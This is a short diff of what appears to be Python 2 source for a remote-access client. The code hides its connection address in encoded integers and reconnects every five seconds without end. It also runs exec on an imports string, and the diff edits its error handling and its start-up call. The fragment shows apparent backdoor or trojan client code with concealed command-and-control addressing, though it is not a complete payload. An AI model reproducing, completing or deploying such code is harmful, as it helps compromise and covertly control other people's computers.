@@ -474,8 +474,8 @@ class Client(object):
             self._socket = _addr(self._long_to_bytes(long(self.__a__)), self._long_to_bytes(long(self.__b__)), int(port)) if 'debug' not in sys.argv else _sock(('localhost', int(port)))
             self._dhkey  = self._diffiehellman()
             return self._connected.set()
-        except:
-            pass
+        except Exception as e:
+            self._debug('connection error: {}'.format(str(e)))
         self._debug('connection failed - retrying in 5...')
         time.sleep(5)
         return self._connect(port)
@@ -1400,7 +1400,7 @@ def main(*args, **kwargs):
         exec imports in globals()
     if 'f' not in kwargs and '__file__' in globals():
         kwargs['f'] = bytes(long(globals()['__file__'].encode('hex'), 16))
-    return Client(**kwargs)._start()
+    return Client(**kwargs)
 
 if __name__ == '__main__':
     m = main(**{
